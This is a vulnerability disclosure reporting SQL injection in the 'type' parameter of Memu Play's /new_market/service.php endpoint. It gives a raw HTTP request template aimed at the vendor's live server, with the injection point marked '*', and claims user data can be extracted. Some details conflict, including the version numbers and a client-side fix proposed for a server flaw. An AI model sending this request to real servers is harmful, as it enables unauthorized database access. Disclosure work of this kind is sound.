# Vulnerability Name - SQL Injection

## Vulnerability Details
- Vulnerability Name: SQL Injection
- Product: Memu Play
- Download Link: [Memu Play Download](https://www.memuplay.com/download-memu-on-pc.html)
- Version: 9.0.9
- Researcher: Pankaj Kumar Thakur (CISO @ Green Tick Nepal Pvt. Ltd.)

## Vulnerability Description
A SQL Injection vulnerability was discovered in Memu Play version 9.0.9. The vulnerability allows an attacker to perform unauthorized database queries by manipulating the `type` parameter in the `/new_market/service.php` endpoint.

## Proof of Concept
The vulnerability can be reproduced by sending a malicious request to the affected endpoint. Below is an example of the raw request:

```
POST /new_market/service.php HTTP/1.1
Host: stat.microvirt.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 321
Content-Type: application/json;charset=UTF-8
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: stat.microvirt.com
X-Forwarded-Proto: https
X-Forwarded-Url: https://stat.microvirt.com/new_market/service.php
Accept-Encoding: gzip

{"action":"postpcmanagementop","appFrom":"","appId":"","appName":"Password Manager","channelId":"cd5e1e15","mac":"38:F3:AB:28:2C:3D","marketVersion":"launcher_6.3.6","module":"install-broadcast","op":"setup","packageAppName":"com.trendmicro.directpass.phone","position":"","type":"*","userName":"-1","version":"9.0.6"}
```

By manipulating the `type` parameter, an attacker can execute arbitrary SQL queries.

## Impact
Successful exploitation of this vulnerability allows an attacker to extract sensitive information from the database, such as usernames, passwords, and other confidential data.

## Recommendation
It is recommended to update Memu Play to the latest version to mitigate this vulnerability. Users should also ensure that their systems are protected by up-to-date antivirus software and follow secure coding practices to avoid potential injection attacks.

## Screenshots
Screenshot extracting the database: [Download Here](https://mega.nz/file/1TF2ADJZ#jANl4t6U0pnmaSo7FNbvRGJg3iGe4n4LX52-uHZWQ_s)

Screenshot extracting the current username: [Download Here](https://mega.nz/file/1TF2ADJZ#jANl4t6U0pnmaSo7FNbvRGJg3iGe4n4LX52-uHZWQ_s)

If you have any further questions or need assistance, please let me know!
